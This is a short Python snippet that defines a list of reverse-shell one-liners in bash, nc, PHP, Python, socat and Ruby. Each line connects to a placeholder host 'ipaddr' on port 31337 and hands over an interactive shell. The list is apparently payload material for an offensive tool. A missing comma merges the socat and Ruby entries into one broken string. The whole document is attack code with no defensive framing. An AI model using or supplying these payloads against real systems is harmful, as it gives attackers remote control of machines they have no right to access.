shells = [f'''/bin/bash -i >& /dev/tcp/ipaddr/31337 0>&1''',
          f'''exec 5<>/dev/tcp/ipaddr/31337;cat <&5 | while read line; do $line 2>&5 >&5; done''',
          f'''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ipaddr 31337 >/tmp/f''',
          f'''nc ipaddr 31337 -e /bin/bash''',
          f'''php -r '$sock=fsockopen("ipaddr",31337);exec("/bin/bash <&3 >&3 2>&3");\'''',
          f'''php -r '$sock=fsockopen("ipaddr",31337);passthru("/bin/bash <&3 >&3 2>&3");\'''',
          f'''python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ipaddr",31337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'''',
          f'''socat TCP:ipaddr:31337 EXEC:/bin/bash'''
          f'''ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("ipaddr",31337))\'''']
